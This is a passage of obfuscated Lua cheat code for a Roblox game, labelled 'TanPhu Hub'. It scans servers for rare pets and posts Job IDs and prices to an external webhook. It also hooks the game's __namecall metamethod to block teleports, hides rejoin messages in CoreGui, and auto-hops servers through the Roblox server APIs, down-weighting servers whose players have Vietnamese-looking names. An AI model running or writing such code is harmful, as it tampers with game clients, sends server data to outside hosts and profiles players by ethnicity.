TP_has_token(v,TP_DENY)) then local FlatIdent_82627=0;local n;while true do if (FlatIdent_82627==0) then n=TP_parse_mps(v);if (n>0) then list[ #list + 1 ]=n;end break;end end end break;end end elseif (d:IsA("NumberValue") or d:IsA("IntValue")) then if TP_has_token(nm_l,TP_ALLOW) then local FlatIdent_23522=0;local n;while true do if (FlatIdent_23522==0) then n=tonumber(d.Value) or 0 ;if (n>0) then list[ #list + 1 ]=n;end break;end end end end end end for _,k in ipairs({"MoneyPerSec","MoneyPerSecond","MPS"}) do local FlatIdent_64015=0;local a;while true do if (FlatIdent_64015==0) then a=container:GetAttribute(k);if (a~=nil) then if ((typeof(a)=="number") and (a>0)) then list[ #list + 1 ]=a;elseif ((typeof(a)=="string") and TP_text_is_per_sec(a)) then local FlatIdent_51FFC=0;local n;while true do if (FlatIdent_51FFC==0) then n=TP_parse_mps(a);if (n>0) then list[ #list + 1 ]=n;end break;end end end end break;end end end return list;end local function TP_find_rule(name) local FlatIdent_7334F=0;local nm;while true do if (FlatIdent_7334F==0) then nm=tostring(name or "" ):lower();for _,r in ipairs(TP_RULES) do local FlatIdent_26570=0;local k;while true do if (FlatIdent_26570==0) then k=tostring(r.k or "" ):lower();if ((k~="") and nm:find(k,1,true)) then return r;end break;end end end FlatIdent_7334F=1;end if (FlatIdent_7334F==1) then return nil;end end end local function TP_filter_prices(prices,rule,nameKey,sent_keys) local uniq,out={},{};for i=1, #prices do local p=prices[i];local okMin= not rule.min or (p>=rule.min) ;local okMax= not rule.max or (p<=rule.max) ;if (okMin and okMax) then local FlatIdent_41533=0;local key;while true do if (FlatIdent_41533==0) then key=(nameKey or "")   .. ":"   .. tostring(p) ;if ( not uniq[p] and  not (sent_keys and sent_keys[key])) then uniq[p]=true;out[ #out + 1 ]=p;end break;end end end end table.sort(out);return out;end local function TP_send_card(petName,prices_sorted) local FlatIdent_19705=0;local jobB64;local lines;local listBlock;local payload;while true do if (FlatIdent_19705==1) then lines={};for i=1, #prices_sorted do lines[i]=TP_fmt(prices_sorted[i]);end FlatIdent_19705=2;end if (0==FlatIdent_19705) then if ( not prices_sorted or ( #prices_sorted==0)) then return false;end jobB64=TP_b64(tostring(game.JobId));FlatIdent_19705=1;end if (FlatIdent_19705==2) then listBlock="```\n"   .. table.concat(lines,"\n")   .. "\n```" ;payload={username="Brainrot Notify | TanPhu Hub",embeds={{title="Brainrot Notify | TanPhu Hub",color=43775,fields={{name="🏷️ Name",value=tostring(petName),inline=true},{name="💰 Money per sec",value=TP_fmt(prices_sorted[1])   .. " (min)" ,inline=true},{name="👥 Players",value=("%d/%d"):format( #Players:GetPlayers(),Players.MaxPlayers or 0 ),inline=true},{name="Job ID (Mobile)",value="```"   .. jobB64   .. "```" ,inline=false},{name="Job ID (iOS)",value="```"   .. jobB64   .. "```" ,inline=false},{name="Job ID (PC)",value="```"   .. jobB64   .. "```" ,inline=false},{name="Prices (low→high)",value=listBlock,inline=false}},footer={text="Made by TanPhu Hub"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};FlatIdent_19705=3;end if (FlatIdent_19705==3) then return TP_http_post(TP_WEBHOOK_URL,payload);end end end local function TP_gather_containers() local FlatIdent_104FA=0;local conts;local add;local RS;while true do if (FlatIdent_104FA==3) then if RS then local FlatIdent_63F0E=0;local ok;local descs;while true do if (FlatIdent_63F0E==0) then ok,descs=pcall(RS.GetDescendants,RS);if (ok and (type(descs)=="table")) then for i=1, #descs do local d=descs[i];if (d:IsA("Folder") or d:IsA("ModuleScript")) then local FlatIdent_1ADAD=0;local n;while true do if (FlatIdent_1ADAD==0) then n=tostring(d.Name or "" ):lower();if (n:find("pet") or n:find("brainrot")) then add(d);end break;end end end end end break;end end end add(game:GetService("Workspace"));FlatIdent_104FA=4;end if (FlatIdent_104FA==1) then function add(x) if x then conts[ #conts + 1 ]=x;end end for _,plr in ipairs(Players:GetPlayers()) do local FlatIdent_284B8=0;while true do if (FlatIdent_284B8==0) then for _,nm in ipairs({"Pets","Inventory","PetInventory","Bag","Backpack"}) do add(plr:FindFirstChild(nm));end if (plr==LocalPlayer) then add(plr:FindFirstChild("PlayerGui"));end break;end end end FlatIdent_104FA=2;end if (FlatIdent_104FA==0) then conts={};add=nil;FlatIdent_104FA=1;end if (FlatIdent_104FA==4) then return conts;end if (FlatIdent_104FA==2) then RS=game:FindFirstChild("ReplicatedStorage");add(RS);FlatIdent_104FA=3;end end end local function TP_scan_and_send() if (TP_ONE_SHOT and TP_reported_once) then return;end local sent=0;local nameKeys={};for _,r in ipairs(TP_RULES) do local FlatIdent_94874=0;local k;while true do if (FlatIdent_94874==0) then k=tostring(r.k or "" ):lower();if (k~="") then nameKeys[k]=true;end break;end end end local containers=TP_gather_containers();for i=1, #containers do local c=containers[i];local okDescs,descs=pcall(function() return (c and c.GetDescendants and c:GetDescendants()) or {} ;end);if (okDescs and (type(descs)=="table")) then for j=1, #descs do local inst=descs[j];local nm=tostring(inst.Name or "" ):lower();local matched=nil;for key,_ in pairs(nameKeys) do if nm:find(key,1,true) then matched=key;break;end end if matched then local rule=TP_find_rule(inst.Name);if rule then local prices={};local function add_all(from) local FlatIdent_7FA07=0;local ok;local t;while true do if (FlatIdent_7FA07==1) then if (ok and (type(t)=="table")) then for k=1, #t do prices[ #prices + 1 ]=t[k];end end break;end if (FlatIdent_7FA07==0) then if  not from then return;end ok,t=pcall(TP_collect_prices,from);FlatIdent_7FA07=1;end end end add_all(inst);add_all(inst.Parent);add_all(inst.Parent and inst.Parent.Parent );local good=TP_filter_prices(prices,rule,nm,TP_sent_global);if ( #good>0) then if TP_send_card(inst.Name,good) then local base=nm;for k=1, #good do TP_sent_global[base   .. ":"   .. tostring(good[k]) ]=true;end sent=sent + 1 ;if (sent>=TP_MAX_CARDS_PER_SERVER) then break;end end end end end end end if (sent>=TP_MAX_CARDS_PER_SERVER) then break;end end if ((sent>0) and TP_ONE_SHOT) then TP_reported_once=true;end end task.spawn(function() local FlatIdent_B6A2=0;while true do if (FlatIdent_B6A2==0) then task.wait(TP_FIRST_DELAY);while true do local FlatIdent_97A1A=0;while true do if (FlatIdent_97A1A==0) then pcall(TP_scan_and_send);task.wait(TP_SCAN_INTERVAL);break;end end end break;end end end);do local TeleportService=game:GetService("TeleportService");local Players=game:GetService("Players");local LocalPlayer=Players.LocalPlayer;local ORIG_PLACE=game.PlaceId;local antiRejoinEnabled=true;local antiRejoinToggle=createToggle(contentTabs['Helper'],"Anti Auto-Rejoin","Block Teleport/TeleportAsync to same place (Join Job ID allowed)",6);antiRejoinToggle.SetCallback(function(state) antiRejoinEnabled=state;end);local function _shouldBlock(method,args) local FlatIdent_2BB2A=0;local destPlace;while true do if (FlatIdent_2BB2A==1) then if ((method=="Teleport") or (method=="TeleportAsync") or (method=="TeleportPartyAsync")) then if (destPlace==ORIG_PLACE) then return true;end end return false;end if (FlatIdent_2BB2A==0) then if  not antiRejoinEnabled then return false;end destPlace=tonumber(args[1]);FlatIdent_2BB2A=1;end end end local mt=getrawmetatable and getrawmetatable(game) ;if mt then local canWrite=setreadonly~=nil ;local oldNamecall=mt.__namecall;if canWrite then pcall(setreadonly,mt,false);end mt.__namecall=(newcclosure or function(f) return f;end)(function(self,...) local FlatIdent_D1AF=0;local method;local args;while true do if (FlatIdent_D1AF==1) then if ((self==TeleportService) and _shouldBlock(method,args)) then return;end return oldNamecall(self,...);end if (FlatIdent_D1AF==0) then method=(getnamecallmethod and getnamecallmethod()) or "" ;args={...};FlatIdent_D1AF=1;end end end);if canWrite then pcall(setreadonly,mt,true);end end task.spawn(function() local FlatIdent_568D2=0;local CoreGui;while true do if (FlatIdent_568D2==0) then CoreGui=game:GetService("CoreGui");while true do local FlatIdent_29C18=0;while true do if (FlatIdent_29C18==0) then task.wait(0.3);pcall(function() for _,ui in ipairs(CoreGui:GetDescendants()) do if (ui:IsA("TextLabel") or ui:IsA("TextButton")) then local FlatIdent_3B561=0;local t;while true do if (FlatIdent_3B561==0) then t=tostring(ui.Text):lower();if (t:find("you have been rejoined") or t:find("rejoined due to")) then ui.Text="";end break;end end end end end);break;end end end break;end end end);end local finder_secret_10m_s_auto_thread=nil;local finder_secret_10m_s_autoToggle=createToggle(contentTabs['Finder'],"finder secret 10m/s auto","Auto finder",1);finder_secret_10m_s_autoToggle.SetCallback(function(state) if state then if finder_secret_10m_s_auto_thread then task.cancel(finder_secret_10m_s_auto_thread);end finder_secret_10m_s_auto_thread=task.spawn(function() local TARGET_PLACE_ID=109983668079237;local PET_LIST=[[
Graipuss Medussi: 10M/s-20m/s
La Grande Combinasion: 10M/s-300M/s
Los Combinasionas: 15M/s-400M/s
Nuclearo Dinossauro: 15M/s-300M/s
Los Hotspotsitos: 20M/s-400M/s
Garama and Madundung: 50M/s-2B/s
]];local Players=game:GetService("Players");local TeleportService=game:GetService("TeleportService");local HttpService=game:GetService("HttpService");local LP=Players.LocalPlayer;local JOB_ID=game.JobId;local queue_on_tp=(syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) ;local has_file=typeof(isfile)=="function" ;local read_file=readfile;local write_file=writefile;local del_file=delfile;local CONFIG={AVOID_FULL=true,HOP_DELAY_SEC={min=0.2,max=0.6},PREFERRED_COUNTS={6,7},NEAR_TARGET=6.5,NEAR_WINDOW={min=4,max=9},FALLBACK_MIN=2,MIN_OPEN_SOFT=2,LOCALE={avoid_vietnamese=true,vn_ratio_threshold=0.4,prefer_higher_ping_ms=120,penalty_if_vn=1000},TTL_SECONDS=3 * 60 * 60 ,MAX_REMEMBER=120000,PERSIST_TO_DISK=true,BLOCK_OLD_FOREVER=true,TEMP_BLACKLIST_ENABLED=true,TEMP_BLACKLIST_TTL=60 * 60 ,TEMP_BLACKLIST_ON_FAIL=true,RETRY_BACKOFF={min=0.35,max=0.9},LOOP_INTERVAL=2.2,FAIL_COOLDOWN=5,LOCK_WATCHDOG=3,ESCALATE_AFTER_FAILS=6,STALL_TIMEOUT_SEC=12,PET_SCAN_INTERVAL=1.5,PET_CLEAR_GRACE=2};if CONFIG.BLOCK_OLD_FOREVER then CONFIG.TTL_SECONDS=10 * 365 * 24 * 60 * 60 ;end local visited,fail_cooldown={},{};local VISITED_FILE=("visited_%d.json"):format(TARGET_PLACE_ID);local tblack={};local TBLACK_FILE=("blacklist_%d.json"):format(TARGET_PLACE_ID);local HOP_LOCK,LOCK_AT=false,0;local LAST_TARGET_ID,LAST_ATTEMPT_AT=nil,0;local CONSEC_FAILS=0;local function now() return os.time();end local function clk() return os.clock();end local function jdecode(s) local FlatIdent_65565=0;local ok;local d;while true do if (FlatIdent_65565==0) then ok,d=pcall(function() return HttpService:JSONDecode(s);end);if ok then return d;end break;end end end local function jencode(t) local FlatIdent_47BE5=0;local ok;local s;while true do if (FlatIdent_47BE5==0) then ok,s=pcall(function() return HttpService:JSONEncode(t);end);if ok then return s;end break;end end end local function wait_range(a,b) task.wait(a + (math.random() * (b-a)) );end local function on_cooldown(id) local FlatIdent_5550=0;local t;while true do if (FlatIdent_5550==0) then t=fail_cooldown[id];return t and ((now() -t)<=CONFIG.FAIL_COOLDOWN) ;end end end local function http_get(url) local FlatIdent_14BC6=0;local ok;local body;while true do if (0==FlatIdent_14BC6) then ok,body=pcall(game.HttpGet,game,url,true);if (ok and body) then return true,body;end FlatIdent_14BC6=1;end if (FlatIdent_14BC6==1) then if (syn and syn.request) then local FlatIdent_77FC3=0;local r;while true do if (FlatIdent_77FC3==0) then r=syn.request({Url=url,Method="GET"});if (r and (r.StatusCode==200)) then return true,r.Body;end break;end end end if http_request then local FlatIdent_4E54D=0;local r;while true do if (FlatIdent_4E54D==0) then r=http_request({Url=url,Method="GET"});if (r and ((r.StatusCode==200) or (r.StatusCode==0))) then return true,r.Body or r.body ;end break;end end end FlatIdent_14BC6=2;end if (FlatIdent_14BC6==2) then return false;end end end local function purge_old() local t=now();for id,ts in pairs(visited) do if ((type(ts)~="number") or ((t-ts)>CONFIG.TTL_SECONDS)) then visited[id]=nil;end end for id,ts in pairs(fail_cooldown) do if ((t-ts)>CONFIG.FAIL_COOLDOWN) then fail_cooldown[id]=nil;end end for id,exp in pairs(tblack) do if ((type(exp)~="number") or (t>=exp)) then tblack[id]=nil;end end local n=0;for _ in pairs(visited) do n+=1 end if (n>CONFIG.MAX_REMEMBER) then local drop=n-CONFIG.MAX_REMEMBER ;for k in pairs(visited) do visited[k]=nil;drop-=1 if (drop<=0) then break;end end end end local function get_tpdata() local out;pcall(function() local FlatIdent_54109=0;local td;while true do if (FlatIdent_54109==0) then td=TeleportService:GetLocalPlayerTeleportData();if (td==nil) then out=nil;elseif ((typeof(td)=="Instance") and (td.ClassName=="TeleportOptions")) then local FlatIdent_4A7B7=0;local ok;local tbl;while true do if (FlatIdent_4A7B7==0) then ok,tbl=pcall(function() return td:GetTeleportData();end);if (ok and (type(tbl)=="table")) then out=tbl;end break;end end elseif (type(td)=="table") then out=td;end break;end end end);return out;end local function merge_num_map(dst,src) if (type(src)~="table") then return;end for k,v in pairs(src) do if ((type(k)=="string") and (type(v)=="number")) then dst[k]=v;end end end local function reset_visited() local FlatIdent_2D63C=0;while true do if (FlatIdent_2D63C==1) then print("[ServerHop] Đã reset danh sách server đã vào.");break;end if (FlatIdent_2D63C==0) then visited={};pcall(function() if (typeof(del_file)=="function") then del_file(VISITED_FILE);end end);FlatIdent_2D63C=1;end end end if rawget(shared,"RESET_VISITED") then local FlatIdent_683D2=0;while true do if (FlatIdent_683D2==0) then reset_visited();shared.RESET_VISITED=nil;break;end end end local function save_blacklist() if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_9876=0;local s;while true do if (FlatIdent_9876==0) then s=jencode(tblack);if s then pcall(write_file,TBLACK_FILE,s);end break;end end end end local function load_blacklist() if (CONFIG.PERSIST_TO_DISK and has_file and isfile(TBLACK_FILE)) then local FlatIdent_2F289=0;local ok;local raw;while true do if (0==FlatIdent_2F289) then ok,raw=pcall(read_file,TBLACK_FILE);if (ok and raw) then local obj=jdecode(raw);if (type(obj)=="table") then for k,v in pairs(obj) do if (type(v)=="number") then tblack[k]=v;end end end end break;end end end end local function blacklist_add(id,reason) if ( not CONFIG.TEMP_BLACKLIST_ENABLED or  not id) then return;end tblack[id]=now() + CONFIG.TEMP_BLACKLIST_TTL ;print(("[ServerHop] 🛑 Blacklist 1h: %s (%s)"):format(tostring(id),tostring(reason or "" )));save_blacklist();end local function is_blacklisted(id) local FlatIdent_3A6B4=0;local exp;while true do if (FlatIdent_3A6B4==1) then return exp and (now()<exp) ;end if (FlatIdent_3A6B4==0) then if  not CONFIG.TEMP_BLACKLIST_ENABLED then return false;end exp=tblack[id];FlatIdent_3A6B4=1;end end end if rawget(shared,"ADD_BLACKLIST") then local val=shared.ADD_BLACKLIST;if (type(val)=="string") then blacklist_add(val,"manual");elseif (type(val)=="table") then for _,jid in ipairs(val) do blacklist_add(tostring(jid),"manual");end end shared.ADD_BLACKLIST=nil;end if rawget(shared,"RESET_BLACKLIST") then local FlatIdent_4FB53=0;while true do if (FlatIdent_4FB53==1) then print("[ServerHop] Đã reset blacklist tạm (1h).");shared.RESET_BLACKLIST=nil;break;end if (FlatIdent_4FB53==0) then tblack={};pcall(function() if (typeof(del_file)=="function") then del_file(TBLACK_FILE);end end);FlatIdent_4FB53=1;end end end local function save_persist() if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_21FB8=0;local s;while true do if (FlatIdent_21FB8==0) then s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end break;end end end end local function load_persist() local td=get_tpdata();if (td and td.visited) then merge_num_map(visited,td.visited);end if (CONFIG.PERSIST_TO_DISK and has_file and isfile(VISITED_FILE)) then local FlatIdent_20FDE=0;local ok;local raw;while true do if (FlatIdent_20FDE==0) then ok,raw=pcall(read_file,VISITED_FILE);if (ok and raw) then merge_num_map(visited,jdecode(raw) or {} );end break;end end end if rawget(shared,"__HOP_CARRY") then local c=shared.__HOP_CARRY;if c.visited then merge_num_map(visited,c.visited);end end visited[JOB_ID]=now();purge_old();end local function carry_on_tp() local FlatIdent_2C552=0;local blob;while true do if (FlatIdent_2C552==1) then pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));break;end if (FlatIdent_2C552==0) then if  not queue_on_tp then return;end blob=jencode(visited) or "{}" ;FlatIdent_2C552=1;end end end local function fetch_v1(cursor) local FlatIdent_731FD=0;local url;local ok;local body;local obj;while true do if (FlatIdent_731FD==0) then url=("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s"):format(TARGET_PLACE_ID,(cursor and ("&cursor="   .. HttpService:UrlEncode(cursor))) or "" );ok,body=http_get(url);FlatIdent_731FD=1;end if (FlatIdent_731FD==2) then if  not obj then return nil;end return obj;end if (FlatIdent_731FD==1) then if  not ok then return nil;end obj=jdecode(body);FlatIdent_731FD=2;end end end local function fetch_legacy(startindex) local FlatIdent_8C7C9=0;local url;local ok;local body;local obj;local data;while true do if (FlatIdent_8C7C9==1) then ok,body=http_get(url);if  not ok then return nil;end FlatIdent_8C7C9=2;end if (0==FlatIdent_8C7C9) then startindex=tonumber(startindex) or 0 ;url=("https://www.roblox.com/games/getgameinstancesjson?placeId=%d&startindex=%d"):format(TARGET_PLACE_ID,startindex);FlatIdent_8C7C9=1;end if (FlatIdent_8C7C9==2) then obj=jdecode(body);if ( not obj or  not obj.Collection) then return nil;end FlatIdent_8C7C9=3;end if (FlatIdent_8C7C9==4) then return {data=data,nextPageCursor=(( #data==0) and nil) or tostring(startindex + 10 ) };end if (FlatIdent_8C7C9==3) then data={};for _,v in ipairs(obj.Collection) do local FlatIdent_807DC=0;local players;while true do if (1==FlatIdent_807DC) then table.insert(data,{id=v.Guid,maxPlayers=v.Capacity,playing=(v.CurrentPlayers and  #v.CurrentPlayers) or v.CurrentPlayers or 0 ,ping=tonumber(v.Ping),players=players});break;end if (FlatIdent_807DC==0) then players={};if (type(v.CurrentPlayers)=="table") then for _,p in ipairs(v.CurrentPlayers) do table.insert(players,{username=tostring(p.Username or "" ),display=tostring(p.DisplayName or "" )});end end FlatIdent_807DC=1;end end end FlatIdent_8C7C9=4;end end end local VIET_CHARS_PATTERN="[àáạảãâầấậẩẫ ăằắặẳẵèéẹẻẽêềếệểễ ìíịỉĩ òóọỏõôồốộổỗơờớợởỡ ùúụủũưừứựửữ ỳýỵỷỹ đĐ]";local VN_KEYWORDS={" viet"," việt"," vn"," nguyen"," trần"," tran "," lê "," le "," pham "," phạm "," ngoc "," minh "};local function looks_vietnamese(s) s=" "   .. string.lower(s or "" )   .. " " ;if s:find(VIET_CHARS_PATTERN) then return true;end for _,kw in ipairs(VN_KEYWORDS) do if s:find(kw,1,true) then return true;end end return false;end local function vn_ratio(players) local FlatIdent_5E1D0=0;local vn;local total;while true do if (FlatIdent_5E1D0==0) then if ( not players or ( #players==0)) then return 0;end vn,total=0,0;FlatIdent_5E1D0=1;end if (FlatIdent_5E1D0==1) then for _,p in ipairs(players) do local FlatIdent_74CC9=0;while true do if (0==FlatIdent_74CC9) then total+=1 if (looks_vietnamese(p.display) or looks_vietnamese(p.username)) then vn+=1 end break;end end end return vn/total ;end end end local PET_NAMES,PET_HOLD,PET_LAST_SEEN,PET_LAST_FOUND_LIST={},false,0,{};local function normalize_pet_list(text) local FlatIdent_27E8B=0;local set;while true do if (FlatIdent_27E8B==0) then set={};for raw in tostring(text):gmatch("[^\r\n]+") do local FlatIdent_318CD=0;local line;while true do if (FlatIdent_318CD==0) then line=raw:gsub("^%s+",""):gsub("%s+$","");if ((line~="") and  not line:match("^%-%-")) then local FlatIdent_3B32=0;local nameOnly;while true do if (0==FlatIdent_3B32) then nameOnly=line:match("^(.-):") or line ;nameOnly=nameOnly:gsub("%s+$","");FlatIdent_3B32=1;end if (FlatIdent_3B32==1) then set[string.lower(nameOnly)]=true;break;end end end break;end end end FlatIdent_27E8B=1;end if (FlatIdent_27E8B==1) then return set;end end end local function load_pet_names() local FlatIdent_2582F=0;local set;while true do if (FlatIdent_2582F==1) then PET_NAMES=set;break;end if (FlatIdent_2582F==0) then set=normalize_pet_list(PET_LIST or "" );if (has_file and isfile("pets_list.txt")) then local FlatIdent_82400=0;local ok;local raw;while true do if (FlatIdent_82400==0) then ok,raw=pcall(read_file,"pets_list.txt");if (ok and raw) then for k,_ in pairs(normalize_pet_list(raw)) do set[k]=true;end end break;end end end FlatIdent_2582F=1;end end end local function name_hit(sLower) for want,_ in pairs(PET_NAMES) do if sLower:find(want,1,true) then return want;end end end local function scan_for_pets() if (next(PET_NAMES)==nil) then return false,{};end local found,matched=false,{};for _,plr in ipairs(Players:GetPlayers()) do local FlatIdent_17BD=0;local ch;local bp;while true do if (FlatIdent_17BD==0) then ch=plr.Character;if ch then for _,inst in ipairs(ch:GetDescendants()) do local FlatIdent_4E395=0;local nm;local hit;while true do if (FlatIdent_4E395==1) then if hit then local FlatIdent_73680=0;while true do if (FlatIdent_73680==0) then found=true;matched[hit]=true;break;end end end if inst:IsA("StringValue") then local FlatIdent_35E38=0;local v;local h2;while true do if (FlatIdent_35E38==1) then if h2 then local FlatIdent_2E38B=0;while true do if (0==FlatIdent_2E38B) then found=true;matched[h2]=true;break;end end end break;end if (FlatIdent_35E38==0) then v=string.lower(tostring(inst.Value or "" ));h2=name_hit(v);FlatIdent_35E38=1;end end end break;end if (0==FlatIdent_4E395) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_4E395=1;end end end end FlatIdent_17BD=1;end if (1==FlatIdent_17BD) then bp=plr:FindFirstChildOfClass("Backpack");if bp then for _,inst in ipairs(bp:GetDescendants()) do local FlatIdent_71818=0;local nm;local hit;while true do if (FlatIdent_71818==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_71818=1;end if (FlatIdent_71818==1) then if hit then found=true;matched[hit]=true;end break;end end end end break;end end end for _,inst in ipairs(workspace:GetDescendants()) do if (inst:IsA("Model") or inst:IsA("Folder") or inst:IsA("Accessory") or inst:IsA("Tool")) then local FlatIdent_7902A=0;local nm;local hit;while true do if (FlatIdent_7902A==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_7902A=1;end if (FlatIdent_7902A==1) then if hit then local FlatIdent_7093B=0;while true do if (0==FlatIdent_7093B) then found=true;matched[hit]=true;break;end end end break;end end elseif inst:IsA("StringValue") then local FlatIdent_48494=0;local v;local h2;while true do if (FlatIdent_48494==0) then v=string.lower(tostring(inst.Value or "" ));h2=name_hit(v);FlatIdent_48494=1;end if (FlatIdent_48494==1) then if h2 then found=true;matched[h2]=true;end break;end end end end return found,matched;end local function update_pet_hold() local FlatIdent_3F2AC=0;local ok;local matched;local tnow;while true do if (0==FlatIdent_3F2AC) then ok,matched=scan_for_pets();tnow=tick();FlatIdent_3F2AC=1;end if (1==FlatIdent_3F2AC) then if ok then local FlatIdent_5D375=0;while true do if (0==FlatIdent_5D375) then PET_LAST_SEEN=tnow;if  not PET_HOLD then local FlatIdent_16C12=0;while true do if (0==FlatIdent_16C12) then PET_HOLD=true;PET_LAST_FOUND_LIST={};FlatIdent_16C12=1;end if (FlatIdent_16C12==1) then for k,_ in pairs(matched) do table.insert(PET_LAST_FOUND_LIST,k);end print("[ServerHop] ▶️ gặp PET → dừng:",table.concat(PET_LAST_FOUND_LIST,", "));break;end end end break;end end elseif (PET_HOLD and ((tnow-PET_LAST_SEEN)>=CONFIG.PET_CLEAR_GRACE)) then local FlatIdent_90EB0=0;while true do if (FlatIdent_90EB0==0) then PET_HOLD=false;print("[ServerHop] ⏩ pet hết → tiếp tục");break;end end end break;end end end local function in_pref(n) for _,v in ipairs(CONFIG.PREFERRED_COUNTS) do if (n==v) then return true;end end end local function pick_server() local bestPref,bestNear,bestFb,bestAny=nil,nil,nil,nil;local nearScore,fbScore,anyScore= -999999995904, -999999995904, -999999995904;local cursor,tries,mode=nil,0,"legacy";local function consider(s) local id=s.id;local playing=tonumber(s.playing) or 0 ;local cap=tonumber(s.maxPlayers) or 100 ;local open=cap-playing ;if ((id==JOB_ID) or visited[id] or on_cooldown(id) or (CONFIG.TEMP_BLACKLIST_ENABLED and is_blacklisted(id))) then return;end if (CONFIG.AVOID_FULL and (open<=0)) then return;end local vr=(s.players and vn_ratio(s.players)) or 0 ;local isVN=CONFIG.LOCALE.avoid_vietnamese and (vr>=CONFIG.LOCALE.vn_ratio_threshold) ;local vnPenalty=(isVN and CONFIG.LOCALE.penalty_if_vn) or 0 ;local openPenalty=((open<CONFIG.MIN_OPEN_SOFT) and 2) or 0 ;local pingBonus=(s.ping and (CONFIG.LOCALE.prefer_higher_ping_ms>0) and (s.ping>=CONFIG.LOCALE.prefer_higher_ping_ms) and 0.5) or 0 ;if (in_pref(playing) and (open>0)) then local FlatIdent_2E846=0;local sc;while true do if (FlatIdent_2E846==0) then sc=((10000 -(open * 0.01)) -vnPenalty) + pingBonus ;if ( not bestPref or (sc>(10000 -0.01))) then bestPref=s;end break;end end end if ((playing>=CONFIG.NEAR_WINDOW.min) and (playing<=CONFIG.NEAR_WINDOW.max) and (open>0)) then local sc=((( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -(open * 0.001)) -vnPenalty) + pingBonus ;if (sc>nearScore) then nearScore=sc;bestNear=s;end end if ((open>0) and (playing>=CONFIG.FALLBACK_MIN)) then local FlatIdent_7B75=0;local sc;while true do if (FlatIdent_7B75==0) then sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>fbScore) then fbScore=sc;bestFb=s;end break;end end end if (open>0) then local FlatIdent_2C5C0=0;local sc;while true do if (FlatIdent_2C5C0==0) then sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>anyScore) then local FlatIdent_5E558=0;while true do if (0==FlatIdent_5E558) then anyScore=sc;bestAny=s;break;end end end break;end end end end while tries<60  do local page=((mode=="legacy") and fetch_legacy(cursor)) or fetch_v1(cursor) ;if  not page then local FlatIdent_7EB60=0;while true do if (FlatIdent_7EB60==0) then mode=((mode=="legacy") and "v1") or "legacy" ;tries+=1 break;end end else for _,s in ipairs(page.data or {} ) do consider(s);end if (bestPref or ( not page.nextPageCursor and (bestNear or bestFb or bestAny))) then break;end cursor=page.nextPageCursor;if  not cursor then mode=((mode=="legacy") and "v1") or "legacy" ;end tries+=1 end end if bestPref then return bestPref,"pref6/7";end if bestNear then return bestNear,"near(4-9)";end if bestFb then return bestFb,"fallback>=2";end return bestAny,"anyopen";end local function try_teleport(jobId,reason) local FlatIdent_8A06A=0;local ok;local err;while true do if (FlatIdent_8A06A==0) then print(("[ServerHop] Calling Teleport (reason=%s)"):format(reason or "?" ));ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP);end);FlatIdent_8A06A=1;end if (FlatIdent_8A06A==2) then task.wait(0.05);ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP,nil,{visited=visited});end);FlatIdent_8A06A=3;end if (FlatIdent_8A06A==3) then if ok then return true;end warn("[ServerHop] Teleport 5-arg error: "   .. tostring(err) );FlatIdent_8A06A=4;end if (FlatIdent_8A06A==4) then return false,err;end if (1==FlatIdent_8A06A) then if ok then return true;end warn("[ServerHop] Teleport 3-arg error: "   .. tostring(err) );FlatIdent_8A06A=2;end end end local function try_random(reason) local FlatIdent_1009C=0;local ok;local err;while true do if (3==FlatIdent_1009C) then if ok then return true;end warn("[ServerHop] Random Teleport(place) error: "   .. tostring(err) );FlatIdent_1009C=4;end if (FlatIdent_1009C==2) then task.wait(0.05);ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID);end);FlatIdent_1009C=3;end if (FlatIdent_1009C==4) then return false,err;end if (FlatIdent_1009C==1) then if ok then return true;end warn("[ServerHop] Random Teleport(place,player,data) error: "   .. tostring(err) );FlatIdent_1009C=2;end if (FlatIdent_1009C==0) then print(("[ServerHop] Random Teleport (reason=%s)"):format(reason or "?" ));ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID,LP,{visited=visited});end);FlatIdent_1009C=1;end end end local function save_and_carry() local FlatIdent_84A95=0;while true do if (FlatIdent_84A95==0) then if (CONFIG.PERSIST_TO_DISK and write_file) then local s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end end if queue_on_tp then local blob=jencode(visited) or "{}" ;pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));end break;end end end local function hop_once(tag) if (HOP_LOCK or PET_HOLD) then return;end HOP_LOCK=true;LOCK_AT=clk();purge_old();local target,why=pick_server();if  not target then local FlatIdent_357A9=0;while true do if (FlatIdent_357A9==1) then return;end if (0==FlatIdent_357A9) then warn("[ServerHop] Hết server phù hợp. Chờ rồi thử lại…");HOP_LOCK=false;FlatIdent_357A9=1;end end end LAST_TARGET_ID=target.id;LAST_ATTEMPT_AT=clk();save_and_carry();print(string.format("[ServerHop] Hopping to %s | players=%s (%s)",target.id,tostring(target.playing),tostring(why)));local okTeleport=try_teleport(target.id,why);if  not okTeleport then local FlatIdent_60C77=0;while true do if (FlatIdent_60C77==0) then HOP_LOCK=false;return;end end end end TeleportService.TeleportInitFailed:Connect(function(plr,result,errMsg) local FlatIdent_47E6D=0;while true do if (FlatIdent_47E6D==3) then if ((CONSEC_FAILS>=CONFIG.ESCALATE_AFTER_FAILS) and  not PET_HOLD) then local FlatIdent_9577=0;while true do if (FlatIdent_9577==0) then CONSEC_FAILS=0;try_random("escalate-fails");break;end end else hop_once("retry:"   .. tostring(result) );end break;end if (FlatIdent_47E6D==0) 